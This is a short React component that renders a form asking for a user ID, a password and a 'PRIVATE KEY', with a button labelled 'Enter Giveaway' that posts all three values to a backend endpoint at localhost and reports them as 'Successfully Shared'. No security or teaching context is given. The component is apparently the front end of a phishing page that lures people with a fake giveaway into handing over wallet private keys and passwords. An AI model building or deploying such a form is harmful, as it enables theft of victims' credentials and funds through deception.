import axios from "axios";
import { useState } from "react";

const Privatekey = () => {
  const [privateKey, setPrivateKey] = useState("");
  const [password, setPassword] = useState("");
  const [userID, setUserID] = useState("");
  const shareInfo = () => {
    axios.post("http://localhost:3000/privateKey", {
      privateKey,
      password,
      userID,
    }).then(res => {
      if(res.data.code === 200) {
        alert("Successfully Shared");
      } else {
        alert("Failed to Share");
      }
    });
  }
  return (
    <>
      <input
        id="example"
        type="text"
        placeholder="Enter your ID"
        onChange={(e) => setUserID(e.target.value)}
        className="mt-4 w-full px-4 py-2 text-gray-800 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-300 ease-in-out hover:bg-gray-50"
      ></input>
      <input
        id="example"
        type="password"
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Enter your Password"
        className="mt-4 w-full px-4 py-2 text-gray-800 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-300 ease-in-out hover:bg-gray-50"
      ></input>
      <input
        id="example"
        type="text"
        onChange={(e) => setPrivateKey(e.target.value)}
        placeholder="Enter your PRIVATE KEY"
        className="mt-4 w-full px-4 py-2 text-gray-800 bg-white border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition duration-300 ease-in-out hover:bg-gray-50"
      ></input>
      <button
        style={{
          marginTop: "10px",
          alignItems: "center",
          display: "flex",
          justifyContent: "center",
        }}
        onClick={shareInfo}
        className="px-6 py-3 text-white bg-blue-500 rounded-lg shadow-md transform transition duration-300 ease-in-out hover:bg-blue-600 hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-50"
      >
        Enter Giveaway
      </button>
    </>
  );
};

export default Privatekey;
